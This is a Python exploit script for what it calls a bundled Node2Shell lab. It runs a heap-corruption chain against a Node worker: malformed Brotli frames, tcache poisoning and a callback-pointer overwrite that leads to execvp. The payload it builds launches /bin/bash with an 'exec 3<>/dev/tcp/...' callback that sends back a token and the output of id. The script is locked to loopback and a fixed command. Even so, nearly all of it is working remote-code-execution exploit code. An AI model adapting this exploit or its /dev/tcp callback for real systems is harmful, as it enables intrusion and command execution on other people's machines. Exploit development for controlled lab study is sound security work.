#!/usr/bin/env python3
"""Constrained ASLR-on worker-heap chain for the bundled Node2Shell lab.

The interface is intentionally fixed to loopback and to a fresh token followed
by `/usr/bin/id`.  It has no arbitrary target, command, or callback option.
"""

from __future__ import annotations

from dataclasses import dataclass
from contextlib import ExitStack
import importlib.util
from pathlib import Path
import re
import secrets
import socket
import struct
import sys
import time


def _load_generator():
    path = Path(__file__).with_name("node2shell_lab.py")
    spec = importlib.util.spec_from_file_location("node2shell_heap_generator", path)
    module = importlib.util.module_from_spec(spec)
    assert spec.loader is not None
    sys.modules[spec.name] = module
    spec.loader.exec_module(module)
    return module


GENERATOR = _load_generator()
TARGET_HOST = "127.0.0.1"
TARGET_PORT = 3000
CALLBACK_HOST = "127.0.0.1"
CALLBACK_PORT = 4444
TOKEN_PATTERN = re.compile(r"N2S_[0-9a-f]{32}")
ID_PATTERN = re.compile(
    r"uid=\d+(?:\([^\r\n)]+\))?\s+gid=\d+(?:\([^\r\n)]+\))?"
    r"(?:\s+groups=[^\r\n]+)?"
)


@dataclass(frozen=True)
class HeapProfile:
    version: str
    node_binary_sha256: str
    bss_payload: int
    callback_gadget: int
    execvp_plt: int
    callback_pointer_offset: int
    context_pointer_offset: int
    poison_staged_position: int
    record_size: int
    tcache_index: int
    ring_from_heap: int

    def validate(self) -> None:
        if re.fullmatch(r"\d+\.\d+\.\d+", self.version) is None:
            raise RuntimeError("invalid exact Node version")
        if re.fullmatch(r"[0-9a-f]{64}", self.node_binary_sha256) is None:
            raise RuntimeError("invalid Node binary SHA-256")
        if self.bss_payload & 0xF:
            raise RuntimeError("poison target must be 16-byte aligned")
        if self.callback_gadget <= 0 or self.execvp_plt <= 0:
            raise RuntimeError("static callback addresses must be positive")
        if self.callback_pointer_offset not in range(0, 0x39, 8):
            raise RuntimeError("callback pointer offset is outside the fixed header")
        if self.context_pointer_offset not in range(0, 0x39, 8):
            raise RuntimeError("context pointer offset is outside the fixed header")
        if self.callback_pointer_offset == self.context_pointer_offset:
            raise RuntimeError("callback and context pointers overlap")
        if not 0x100 <= self.record_size <= 0x400:
            raise RuntimeError("record size is outside the isolated lab range")
        if not 0 <= self.tcache_index < 64:
            raise RuntimeError("invalid tcache index")
        if self.poison_staged_position >= 0 or self.ring_from_heap <= 0:
            raise RuntimeError("unexpected relative heap layout")


def framed(data: bytes) -> bytes:
    return struct.pack(">I", len(data)) + data


def _connect(timeout: float) -> socket.socket:
    connection = socket.create_connection((TARGET_HOST, TARGET_PORT), min(timeout, 2.0))
    peer = connection.getpeername()[0]
    if peer != TARGET_HOST:
        connection.close()
        raise RuntimeError(f"refusing non-loopback peer: {peer}")
    connection.settimeout(timeout)
    return connection


def send_fragmented(connection: socket.socket, data: bytes, fragment_size: int) -> None:
    if fragment_size == 0:
        connection.sendall(data)
        return
    if not 1 <= fragment_size <= 4096:
        raise ValueError("fragment size must be zero or between 1 and 4096")
    for offset in range(0, len(data), fragment_size):
        connection.sendall(data[offset : offset + fragment_size])


def hold_background_connections(
    stack: ExitStack, count: int, timeout: float
) -> list[socket.socket]:
    """Hold bounded, incomplete benign frames to model concurrent clients."""

    if not 0 <= count <= 8:
        raise ValueError("background connection count must be between 0 and 8")
    held: list[socket.socket] = []
    for _ in range(count):
        connection = stack.enter_context(_connect(timeout))
        connection.sendall(struct.pack(">I", 1))
        held.append(connection)
    return held


def receive_line(connection: socket.socket, limit: int = 256) -> bytes:
    data = bytearray()
    while len(data) < limit:
        part = connection.recv(1)
        if not part:
            break
        data.extend(part)
        if part == b"\n":
            break
    return bytes(data)


def receive_at_least(connection: socket.socket, minimum: int, limit: int) -> bytes:
    data = bytearray()
    while len(data) < minimum and len(data) < limit:
        part = connection.recv(min(65536, limit - len(data)))
        if not part:
            break
        data.extend(part)
    return bytes(data)


def receive_to_close(connection: socket.socket, limit: int = 1024) -> bytes:
    data = bytearray()
    while len(data) < limit:
        part = connection.recv(min(512, limit - len(data)))
        if not part:
            break
        data.extend(part)
    return bytes(data)


def healthcheck(timeout: float) -> bool:
    try:
        with _connect(timeout) as connection:
            connection.sendall(framed(b""))
            return receive_line(connection) == b"PONG\n"
    except OSError:
        return False


def wait_ready(timeout: float = 8.0) -> None:
    deadline = time.monotonic() + timeout
    while time.monotonic() < deadline:
        if healthcheck(min(timeout, 1.0)):
            return
        time.sleep(0.1)
    raise RuntimeError("bundled worker lab did not become healthy")


def stage_two(position: int, size: int) -> bytes:
    if size < 27:
        raise ValueError("stage two must be at least 27 bytes")
    body = bytearray(size)
    body[7] = 8
    struct.pack_into("<iII", body, 15, position, 0x7FFFFFFF, 0x7FFFFFFF)
    return bytes(body)


def stage_one(target: int, command_block_extra: int, prefix_payload: bytes = b"") -> bytes:
    if len(prefix_payload) > 512:
        raise ValueError("proof payload exceeds 512 bytes")
    prefix = bytearray(1024)
    prefix[: len(prefix_payload)] = prefix_payload
    pair = struct.pack("<QQ", target, target)
    start = 71 if not prefix_payload else len(prefix_payload) + ((7 - len(prefix_payload)) % 16)
    for offset in range(start, len(prefix) - 15, 16):
        prefix[offset : offset + 16] = pair
    return GENERATOR.malformed_brotli(bytes(prefix), command_block_extra) + b"\0" * 3


def build_fixed_proof(profile: HeapProfile, token: str) -> bytes:
    profile.validate()
    if TOKEN_PATTERN.fullmatch(token) is None:
        raise RuntimeError("invalid proof token")
    base = profile.bss_payload
    context_offset = 0x40
    context = base + context_offset
    filename = base + 0x100
    argv = base + 0x110
    option_c = base + 0x140
    command_address = base + 0x150
    command = (
        f"exec 3<>/dev/tcp/{CALLBACK_HOST}/{CALLBACK_PORT};"
        f"printf '{token}\\n'>&3;/usr/bin/id >&3"
    )

    data = bytearray(512)
    struct.pack_into("<Q", data, profile.context_pointer_offset, context)
    struct.pack_into("<Q", data, profile.callback_pointer_offset, profile.callback_gadget)
    struct.pack_into("<Q", data, context_offset + 0x98, filename)
    struct.pack_into("<Q", data, context_offset + 0xA0, argv)
    struct.pack_into("<Q", data, context_offset + 0xA8, profile.execvp_plt)
    data[0x100 : 0x10A] = b"/bin/bash\0"
    struct.pack_into("<QQQQ", data, 0x110, filename, option_c, command_address, 0)
    data[0x140 : 0x143] = b"-c\0"
    encoded = command.encode("ascii") + b"\0"
    if 0x150 + len(encoded) > len(data):
        raise RuntimeError("fixed proof command does not fit")
    data[0x150 : 0x150 + len(encoded)] = encoded
    return bytes(data)


def verify_proof(token: str, proof: bytes, peer: str) -> str:
    if peer != CALLBACK_HOST:
        raise RuntimeError(f"refusing proof from non-loopback peer: {peer}")
    text = proof.decode("ascii", errors="replace")
    prefix = token + "\n"
    if not text.startswith(prefix):
        raise RuntimeError("callback token mismatch")
    identity = text[len(prefix) :].strip()
    if ID_PATTERN.fullmatch(identity) is None:
        raise RuntimeError("callback did not contain complete id output")
    return identity


def attack(
    profile: HeapProfile,
    timeout: float = 8.0,
    *,
    background_connections: int = 0,
    fragment_size: int = 0,
) -> dict[str, object]:
    profile.validate()
    if not 0 <= background_connections <= 8:
        raise ValueError("background connection count must be between 0 and 8")
    if fragment_size != 0 and not 1 <= fragment_size <= 4096:
        raise ValueError("fragment size must be zero or between 1 and 4096")
    token = "N2S_" + secrets.token_hex(16)
    proof_payload = build_fixed_proof(profile, token)
    groom_first = stage_one(0x0003000000030000, 0xFFFFFF)
    poison_first = stage_one(profile.bss_payload, 0xFFBF10, proof_payload)

    with ExitStack() as stack:
        hold_background_connections(stack, background_connections, timeout)
        listener = stack.enter_context(socket.socket(socket.AF_INET, socket.SOCK_STREAM))
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((CALLBACK_HOST, CALLBACK_PORT))
        listener.listen(1)
        listener.settimeout(timeout)
        groom = stack.enter_context(_connect(timeout))
        send_fragmented(groom, framed(groom_first), fragment_size)
        if receive_line(groom) != b"ACK\n":
            raise RuntimeError("groom stage was not acknowledged")
        send_fragmented(groom, framed(stage_two(-1, 127)), fragment_size)
        if len(receive_at_least(groom, 16384, 65536)) < 16384:
            raise RuntimeError("groom output was too short")
        exploit = stack.enter_context(_connect(timeout))
        send_fragmented(exploit, framed(poison_first), fragment_size)
        if receive_line(exploit) != b"ACK\n":
            raise RuntimeError("poison stage was not acknowledged")
        send_fragmented(
            exploit,
            framed(stage_two(profile.poison_staged_position, 27)),
            fragment_size,
        )
        callback, peer = listener.accept()
        with callback:
            callback.settimeout(min(timeout, 5.0))
            proof = receive_to_close(callback)
    identity = verify_proof(token, proof, peer[0])
    return {
        "result": "rce-verified",
        "proof_token": token,
        "proof_command": "/usr/bin/id (fixed)",
        "proof_stdout": identity,
        "proof_channel": "fresh loopback callback",
        "callback_peer": peer[0],
        "background_connections": background_connections,
        "fragment_size": fragment_size,
    }
